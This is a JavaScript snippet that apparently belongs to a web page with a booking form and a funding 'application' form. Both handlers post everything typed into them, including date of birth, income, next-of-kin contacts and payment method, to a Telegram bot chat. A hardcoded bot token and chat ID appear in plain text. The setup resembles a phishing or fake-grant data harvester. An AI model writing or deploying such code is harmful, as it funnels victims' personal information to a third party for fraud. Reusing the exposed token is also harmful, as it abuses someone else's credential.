
    document.getElementById("bookingForm").addEventListener("submit", async function (e) {
        e.preventDefault();

        const name = document.getElementById("name").value;
        const email = document.getElementById("email").value;
        const message = document.getElementById("message").value;

        const botToken = "7576953137:AAHmUYxqqFwCO4guB6C3kmicU4Hle7ruyJQ";
        const chatId = "1790394521"; // Replace with your chat ID or group's chat ID
        const text = `New Booking Form Submission:
Name: ${name}
Email: ${email}
Message: ${message}`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

        try {
            const response = await fetch(url, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ chat_id: chatId, text }),
            });

            if (response.ok) {
                // alert("Form submitted and sent to Telegram successfully!");
                document.getElementById("bookingForm").reset();
            } else {
                alert("Failed to send the message to Telegram.");
            }
        } catch (error) {
            console.error("Error:", error);
            // alert("An error occurred while sending the message.");
        }
    });



    
    const form = document.getElementById("loginForm");

    form.addEventListener("submit", async (event) => {
        event.preventDefault(); // Prevent form from submitting traditionally

        // Collect form data
        const formData = new FormData(form);
        const data = Object.fromEntries(formData.entries());

        // Format the message
        const message = `
<b>Application Form Submission</b>
-----------------------------------
<b>First Name:</b> ${data.fname}
<b>Last Name:</b> ${data.lname}
<b>Email Address:</b> ${data.usr_email}
<b>Phone Number:</b> ${data.usr_phone}
<b>Home Address:</b> ${data.home || "N/A"}
<b>City:</b> ${data.city || "N/A"}
<b>State:</b> ${data.state}
<b>Country:</b> ${data.country}
<b>Gender:</b> ${data.gender}
<b>Date of Birth:</b> ${data.dob}
<b>Citizen Status:</b> ${data.citizen_stat}
<b>Employment Status:</b> ${data.employment_stat}
<b>Annual Income:</b> $${data.annual_income}
<b>Next of Kin Name:</b> ${data.nok_name}
<b>Next of Kin Email:</b> ${data.nok_email}
<b>Next of Kin Address:</b> ${data.nok_addr || "N/A"}
<b>Next of Kin Phone:</b> ${data.nok_phone}
<b>Payment Method:</b> ${data.payment_method}
<b>Reason for Application:</b> ${data.app_reason || "N/A"}
<b>Funding Needed:</b> ${data.amt_needed}
<b>Funding Category:</b> ${data.cat_funding}
-----------------------------------
        `;

        // Send the message to Telegram
        const telegramBotToken = "7576953137:AAHmUYxqqFwCO4guB6C3kmicU4Hle7ruyJQ";
        const chatId = "1790394521";

        try {
            const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json",
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: "HTML",
                }),
            });

            if (response.ok) {
                document.getElementById("responseMessage").textContent =
                    "Application submitted successfully!";
                form.reset(); // Reset the form
            } else {
                document.getElementById("errorMessage").textContent =
                    "Failed to send application. Please try again.";
            }
        } catch (error) {
            document.getElementById("errorMessage").textContent =
                "An error occurred. Please try again later.";
        }
    });


